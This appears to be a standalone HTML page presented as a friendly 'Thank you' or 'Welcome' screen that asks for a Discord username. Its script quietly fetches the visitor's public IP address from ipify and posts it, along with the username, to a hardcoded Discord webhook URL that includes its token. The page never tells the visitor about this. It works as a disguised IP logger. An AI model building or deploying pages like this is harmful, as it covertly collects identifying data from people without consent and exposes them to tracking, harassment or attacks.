<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank you. :)</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #121212;
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        input[type="text"] {
            padding: 10px;
            font-size: 18px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            width: calc(100% - 22px);
        }
        #clickMeBtn {
            padding: 20px 40px;
            font-size: 24px;
            color: white;
            background-color: green;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #clickMeBtn:disabled {
            background-color: grey;
            cursor: not-allowed;
        }
        #clickMeBtn:hover:enabled {
            background-color: darkgreen;
        }
        label {
            font-size: 18px;
            margin-bottom: 10px;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome!</h1>
        <p>Please enter your Discord username to proceed:</p>
        <label for="discordUsername">Enter your Discord username:</label>
        <input type="text" id="discordUsername" placeholder="Discord Username">
        <br>
        <button id="clickMeBtn" disabled>CLICK ME!</button>
    </div>

    <script>
        const discordUsernameInput = document.getElementById('discordUsername');
        const clickMeBtn = document.getElementById('clickMeBtn');

        discordUsernameInput.addEventListener('input', function() {
            clickMeBtn.disabled = !discordUsernameInput.value.trim();
        });

        clickMeBtn.addEventListener('click', function() {
            const discordUsername = discordUsernameInput.value.trim();
            if (!discordUsername) {
                alert('Please enter your Discord username.');
                return;
            }

            // Get the IP address using ipify
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    // Send the IP address and Discord username to the Discord webhook
                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
                    const message = {
                        content: `(${ip}) - [${discordUsername}]`
                    };
                    
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .catch(error => {
                        console.error('ERROR', error);
                    });
                })
                .catch(error => {
                    console.error('ERROR', error);
                });
        });
    </script>
</body>
</html>
